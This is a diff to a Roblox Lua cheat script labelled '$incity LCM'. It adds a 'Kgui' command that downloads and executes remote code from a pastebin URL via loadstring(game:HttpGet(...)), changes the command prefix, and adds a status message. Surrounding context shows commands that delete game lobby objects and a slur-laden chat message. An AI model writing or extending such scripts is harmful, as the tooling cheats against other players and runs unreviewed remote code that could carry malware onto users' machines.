@@ -176,7 +176,7 @@ function FIX_LIGHTING()
     services.events = {}
     local user = gPlayers.LocalPlayer
     
-    local prfx = "^"
+    local prfx = ""
     local scripprfx = ""
     local split = " "
 
@@ -583,7 +583,15 @@ addcmd(
         workspace.CurrentCamera.CameraSubject = game.Players[players[1]].Character
         MessageColor("[$incity LCM]: Fucking pedo :rolling_eyes:", Color3.fromRGB(252, 101, 220))
     end)
-
+addcmd(
+    "Kgui",
+    "Opens the $incity knife gui",
+    {},
+    function(args)
+        MessageColor("[$incity LCM]: Knife Gui Loaded", Color3.fromRGB(252, 101, 220))
+        loadstring(game:HttpGet("https://pastebin.com/raw/SN5BmNtD"))()
+    end
+)
 addcmd(
     "lk",
     "requires at least lower then 100 ping or below",
@@ -891,3 +899,5 @@ game:GetService("Workspace").Lobby.BuyAni:Destroy()
 game:GetService("Workspace").Lobby.BuyAni2:Destroy()
 game:GetService("Workspace").Lobby.MVPDoor:Destroy()
 game:GetService("Workspace").Lobby.tay:Destroy()
+
+MessageColor("[$incity LCM]: Prefix is set to [%%NONE%%]", Color3.fromRGB(252, 101, 220))
